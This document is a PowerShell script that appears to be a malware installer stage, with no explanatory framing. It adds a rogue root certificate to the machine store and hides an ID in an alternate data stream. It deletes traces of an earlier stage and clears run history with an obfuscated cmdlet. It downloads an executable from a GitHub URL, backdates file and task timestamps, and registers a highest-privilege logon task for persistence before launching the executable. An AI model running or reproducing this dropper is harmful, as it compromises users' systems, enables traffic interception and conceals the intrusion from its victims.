$programDir = "C:\Program Files\Data\9871d3a2c554b27151cacf1422eec048\"
[System.Environment]::SetEnvironmentVariable("PATH", "$env:PATH;C:\Program Files\Data\9871d3a2c554b27151cacf1422eec048\", [System.EnvironmentVariableTarget]::Machine)

Write-Host "Enter PIN:"
$id = Read-Host
New-Item    -Path ($programDir + "vxhost.exe") -ItemType File -Force
Set-Content -Path ($programDir + "vxhost.exe:uid.txt") -Value $id.Trim()

$base64Cert = @"
TUlJRHJUQ0NBcFdnQXdJQkFnSVVEOTM1Z1VMclcwTmxlRE15bzY1YXc5eHhRRkF3RFFZSktvWklodmNOQVFFTA0KQlFBd1pqRUxNQWtHQTFVRUJoTUNRMEV4Q3pBSkJnTlZCQWdNQWtKRE1SSXdFQVlEVlFRSERBbFdZVzVqYjNWMg0KWlhJeEZEQVNCZ05WQkFvTUMxUlVWQ0JUZEhWa2FXOXpNUXN3Q1FZRFZRUUxEQUpKVkRFVE1CRUdBMVVFQXd3Sw0KZEhSMExuTjBkV1JwYnpBZUZ3MHlOREE1TURZd01URTJNelJhRncweU56QTJNRE13TVRFMk16UmFNR1l4Q3pBSg0KQmdOVkJBWVRBa05CTVFzd0NRWURWUVFJREFKQ1F6RVNNQkFHQTFVRUJ3d0pWbUZ1WTI5MWRtVnlNUlF3RWdZRA0KVlFRS0RBdFVWRlFnVTNSMVpHbHZjekVMTUFrR0ExVUVDd3dDU1ZReEV6QVJCZ05WQkFNTUNuUjBkQzV6ZEhWaw0KYVc4d2dnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUURVVEVwTld2WHVUOXRaQkhmSw0KekJGc0hlelE4bUpxUk51c1VmaVJrVHR2dDdQSXh5TFU0czdSQk1sK3N6L1cwKzZacGVhSklaZ1AyRTg0Y0lLVA0KTmhCQkcxZm14YURZM0luUVZHcDFtUnFKUDhHWEl1bER5dmI3d0UwL29VdU10emhPY21rMkMvM3V4MVgxdHMvKw0KOElSUkV5SStPKzhWZnlpTXNlbDFWR0lFZDloRC9GN3FmdE1mVW1qTytuTG41eUJTMy95L3JmejVPalZXR1RHdQ0Kb2I4bytmcGVLRVZoaW1ZRmJYZWpJSWR0eENkSXlqMGZXYjMxYllpUUlsSE5hTmFSeERCVUpjMkJJSHlrS3JRWA0KOVNvN0d3dEhobE1sREllUVlhSXJ0VG9XeDJoMFR0TmNzRHRkU2hVY2hzMCtpeHJXQktFZXQ2dHlYMnlzc1FHQw0KcE52L0FnTUJBQUdqVXpCUk1CMEdBMVVkRGdRV0JCU3IzU3BqSWo5b1NsRjNpNkQ3VHR3WDZkOWpIakFmQmdOVg0KSFNNRUdEQVdnQlNyM1NwaklqOW9TbEYzaTZEN1R0d1g2ZDlqSGpBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUEwRw0KQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUFMYlVxcDZiQmU1RmhvVDFsRHgrL3ZiV1VLVUt0TW1QUktZaUJLMmNXTw0KT2prSi8wL2hRRzhDTXhhS2hOQ0VBRjBaOEREREI5bmZxdFFIMXIveXdsblVRMk9kOU1lc2NFYnlMaHRISVRNcQ0KZ094ZTZuMW45aElBbDNDT2JPMW9wREZIMVdLTUc3WkxZRmE4ditaZmFVY0lIWElweWJyckxPR1ppa0xuWFYvaw0KdWZuZm5RU1dBZElKZlprNDUrMGE1SGtKaVRjVVIzWGtnL3U5aysya0VYbHdMOWNEcUY4NWFFVHlsYlV5Ky9IWg0KcTdicnUvNE5lVWYrL2FINHd0Z0VZaU1ZZ3ZxbzlJYkhjM1hFd2RHSkx6b1pMRTE3ejlWZXhrZTNhV3RHZ2E5Nw0KMHZ5Z0xrdW5uRWsrWEthVjhQQXVtd2U0cGpWdGF1NFp2aU13L3NzRE1nSnM=
"@

$certBytes = [System.Convert]::FromBase64String($base64Cert)
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$cert.Import($certBytes)
$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")

$store.Open("ReadWrite")
$store.Add($cert)
$store.Close()
echo "[+] Cert"

$stage1Path = ("C:\Users\" + $env:USERNAME + "\AppData\Roaming\Data\")
Remove-Item -Path $stage1Path -Force -Recurse
Unregister-ScheduledTask -TaskName "Qihoo360"
Remove-Item -Path "C:\Windows\System32\st.exe"

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$values = Get-ItemProperty -Path $regPath
foreach ($valueName in $values.PSObject.Properties.Name)
{
    if ($valueName -ne "(default)")
    {
        Re''mov''e-I''temPr''oper''ty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue
    }
}

$updaterPath = $programDir + "update.exe"
curl "https://raw.githubusercontent.com/mhali43/mw2/refs/heads/main/update.exe" -o $updaterPath

(Get-Item $updaterPath).CreationTime=("1 Jan 2000 0:00:00")
(Get-Item $updaterPath).LastWriteTime=("1 Jan 2000 0:00:00")
(Get-Item $updaterPath).LastAccessTime=("1 Jan 2000 0:00:00")

$TaskName = "UpdateTask"
$action = New-ScheduledTaskAction -Execute $updaterPath
$trigger = New-ScheduledTaskTrigger -AtLogon
$Stset = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Force -RunLevel Highest -Settings $Stset

$TaskPath = "C:\Windows\System32\Tasks\" + $TaskName
[xml]$xml = (Get-Content -Path $TaskPath -Encoding Unicode)
if($xml.Task.RegistrationInfo.Date)
{
    $xml.Task.RegistrationInfo.Date = "1999-01-01T00:00:00.0000000"
    $xml.Save($TaskPath)
}

(Get-Item $TaskPath).CreationTime=("1 Jan 2000 0:00:00")
(Get-Item $TaskPath).LastWriteTime=("1 Jan 2000 0:00:00")
(Get-Item $TaskPath).LastAccessTime=("1 Jan 2000 0:00:00")

Start-Process -FilePath $updaterPath
